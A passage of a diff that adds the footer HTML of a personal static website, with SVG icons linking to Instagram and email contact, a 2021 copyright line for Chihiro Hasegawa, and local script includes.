+><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z" />
+</svg>
+</a>
+      </li><li>
+        <a href='https://instagram.com/encry1024' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Open Instagram account in new tab</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
+<path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
+<line x1="17.5" y1="6.5" x2="17.51" y2="6.5" />
+</svg>
+</a>
+      </li><li>
+        <a href='mailto:encry1024@gmail.com' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Contact via Email</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
+<polyline points="22,6 12,13 2,6" />
+</svg>
+</a>
+      </li></ul>
+  </nav>
+</section><div class='copyright'>
+  <p> &copy; 2021 Chihiro Hasegawa </p>
+</div>
+
+        </div>
+      </footer>
+
+    </div>
+  </div><script>window.__assets_js_src="/assets/js/"</script>
+
+<script src='/assets/js/main.c3bcf2df.js'></script><script src='/js/custom.js'></script>
+
+</body>
+
+</html>
+
